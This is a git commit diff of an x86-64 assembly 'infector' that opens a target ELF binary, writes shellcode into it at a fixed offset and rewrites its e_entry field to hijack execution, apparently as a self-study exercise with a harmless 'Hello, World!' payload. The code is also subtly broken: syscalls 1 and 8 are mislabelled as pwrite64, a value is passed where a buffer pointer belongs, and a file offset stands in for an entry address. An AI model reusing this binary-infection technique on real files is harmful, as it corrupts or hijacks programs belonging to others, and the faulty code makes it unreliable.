045d002da095e59bb351fec32642c1ea3a523532
kali <kokomorgan012@gmail.com>
2024-12-13 16:13:35 +0100

    les ELF age et cible ont été corrompu je repart sur yn nouveau ELF clean

--- infector.asm
+++ infector.asm
@@ -1,74 +1,66 @@
 section .data
-filename db 'age', 0               ; Nom du fichier ELF cible
-entry_offset equ 0x18              ; Offset de e_entry dans l'en-tête ELF
-shellcode:                         ; Shellcode pour afficher "Hello, World!"
-    call get_message               ; Calculer dynamiquement l'adresse du message
+filename db 'cible', 0           ; Nom du fichier ELF cible
+entry_offset equ 0x18            ; Offset de e_entry dans l'en-tête ELF
+injection_offset equ 0x1160      ; Offset où injecter le shellcode
+
+shellcode:                       ; Shellcode simple : affiche "Hello, World!"
+    call get_message
 get_message:
-    pop rsi                        ; Adresse du message dans RSI
-    mov rax, 1                     ; syscall write
-    mov rdi, 1                     ; stdout
-    mov rdx, msg_len               ; Taille du message
+    pop rsi                      ; Adresse du message
+    mov rax, 1                   ; syscall write
+    mov rdi, 1                   ; stdout
+    mov rdx, msg_len             ; Taille du message
     syscall
 
-    mov rax, 60                    ; syscall exit
-    xor rdi, rdi                   ; Code de retour 0
+    mov rax, 60                  ; syscall exit
+    xor rdi, rdi                 ; Code de sortie 0
     syscall
 
-msg db "Hello, World!", 0xA        ; Le message
-msg_len equ $ - msg                ; Taille du message
-shellcode_size equ $ - shellcode   ; Taille totale du shellcode
-
-section .bss
-buffer resb 32768                  ; Buffer pour stocker le contenu ELF
+msg db "Hello, World!", 0xA      ; Message à afficher
+msg_len equ $ - msg              ; Taille du message
+shellcode_size equ $ - shellcode ; Taille totale du shellcode
 
 section .text
 global _start
 
 _start:
-    ; 1. Ouvrir le fichier ELF cible
-    mov rax, 2                    ; sys_open
-    lea rdi, [rel filename]       ; Nom du fichier ELF
-    mov rsi, 2                    ; O_RDWR (lecture/écriture)
+    ; 1. Ouvrir le fichier ELF en O_RDWR
+    mov rax, 2                   ; syscall sys_open
+    lea rdi, [rel filename]      ; Nom du fichier ELF
+    mov rsi, 2                   ; O_RDWR
     syscall
     cmp rax, 0
     js error_exit
-    mov r8, rax                   ; Sauvegarder le descripteur de fichier
+    mov r8, rax                  ; Sauvegarder le descripteur de fichier
 
-    ; 2. Lire le contenu ELF
-    mov rax, 0                    ; sys_read
-    mov rdi, r8                   ; Descripteur de fichier
-    lea rsi, [rel buffer]         ; Buffer pour lecture
-    mov rdx, 32768                ; Taille maximale
+    ; 2. Injecter le shellcode à l'offset choisi
+    mov rax, 1                   ; syscall sys_pwrite64
+    mov rdi, r8                  ; Descripteur de fichier
+    lea rsi, [rel shellcode]     ; Adresse du shellcode
+    mov rdx, shellcode_size      ; Taille du shellcode
+    mov r10, injection_offset    ; Offset d'injection
     syscall
 
-    ; 3. Injecter le shellcode à l'offset 0x4000
-    mov rax, 1                    ; sys_pwrite64
-    mov rdi, r8                   ; Descripteur de fichier
-    lea rsi, [rel shellcode]      ; Adresse du shellcode
-    mov rdx, shellcode_size       ; Taille du shellcode
-    mov r10, 0x4000               ; Offset d'injection
+    ; 3. Modifier l'entrée principale (e_entry)
+    mov rax, 8                   ; syscall sys_pwrite64
+    mov rdi, r8                  ; Descripteur de fichier
+    mov rsi, injection_offset    ; Adresse du shellcode (0x1160)
+    mov rdx, 8                   ; Taille de l'écriture
+    mov r10, entry_offset        ; Offset de e_entry
     syscall
 
-    ; 4. Modifier l'entrée principale (e_entry)
-    mov rax, 8                    ; sys_pwrite64
-    mov rdi, r8                   ; Descripteur de fichier
-    mov rsi, r10                  ; Nouvelle adresse d'entrée principale (0x4000)
-    mov rdx, 8                    ; Taille de l'adresse
-    mov r10, entry_offset         ; Offset de e_entry (0x18 dans l'en-tête ELF)
+    ; 4. Fermer le fichier
+    mov rax, 3                   ; syscall sys_close
+    mov rdi, r8                  ; Descripteur de fichier
     syscall
 
-    ; 5. Fermer le fichier
-    mov rax, 3                    ; sys_close
-    mov rdi, r8                   ; Descripteur de fichier
-    syscall
-
-    ; 6. Quitter proprement
-    xor rdi, rdi                  ; Code de sortie 0
-    mov rax, 60                   ; sys_exit
+    ; Quitter proprement
+    xor rdi, rdi
+    mov rax, 60
     syscall
 
 error_exit:
-    mov rdi, 1                    ; Code d'erreur 1
-    mov rax, 60                   ; sys_exit
+    mov rdi, 1                   ; Code d'erreur
+    mov rax, 60
     syscall
 
